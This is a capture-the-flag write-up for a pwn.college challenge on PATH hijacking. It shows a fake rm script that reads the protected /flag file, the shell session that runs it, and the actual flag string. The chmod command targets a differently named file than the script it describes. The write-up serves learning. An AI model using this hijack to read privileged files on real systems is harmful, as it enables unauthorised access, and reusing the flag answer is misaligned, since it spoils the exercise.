# Pondering PATH

## Hijacking Commands 
Armed with your knowledge, you can now carry out some shenanigans. This challenge is almost the same as the first challenge in this module. Again, this challenge will delete the flag using the rm command. But unlike before, it will not print anything out for you.

How can you solve this? You know that rm is searched for in the directories listed in the PATH variable. You have experience creating the win command when the previous challenge needed it. What else can you create?


### Solve
**Flag:** `pwn.college{MheuJl55QoyArWGL9sHGOK3lTGe.QX3cjM1wSNyMzNzEzW}`

When `/challenge/run` is run, it will delete the file `/flag` using the `rm` command. We can replace the `rm` command with the same shell script from the previous challenge, renamed `rm`. Thus, when `/challenge/run` tries to delete the file, it will instead read the file using `cat`.

Therefore, the shell script `/home/hacker/rm` should be:
```
#!/bin/bash
/run/dojo/bin/cat /flag
```
After making the shell script, it can be made executable by all users using `chmod a+x`. The `PATH` variable can now be set to `/home/hacker` (directory of `win`).

```
which cat
/run/dojo/bin/cat
chmod a+x /home/hacker/win
PATH="/home/hacker"
/challenge/run
bash: sed: command not found
Trying to remove /flag...
pwn.college{MheuJl55QoyArWGL9sHGOK3lTGe.QX3cjM1wSNyMzNzEzW}
```
### New Learnings

We can "hijack" commands by removing their parent directory from `PATH` and adding the directory of our own shell script with the same name as the command to `PATH`.